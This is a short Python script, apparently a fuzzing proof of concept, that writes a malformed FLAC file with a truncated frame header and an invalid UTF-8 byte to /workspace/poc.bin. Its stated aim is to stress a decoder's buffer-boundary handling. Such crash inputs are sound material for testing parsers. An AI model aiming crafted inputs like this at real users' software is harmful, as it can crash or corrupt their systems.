from pathlib import Path
p=Path('/workspace/poc.bin')
# Try malformed variable-length frame header with declared blocksize hints and truncated UTF-8 continuation.
payload = bytearray(b'fLaC')
# STREAMINFO
payload += bytes([0x00,0x00,0x00,0x22]) + b'\x00'*34
# Frame-like bytes after metadata to trigger frame parsing
payload += b'\xff\xf8\x69\xf0'  # sync, blocksize/sample-rate hints, channel/bps bits
payload += b'\xff'                # invalid utf8 start (non-UTF8 code path)
# No more bytes; parser may back up and resync, stressing buffer boundary logic
p.write_bytes(payload)
print(len(payload))
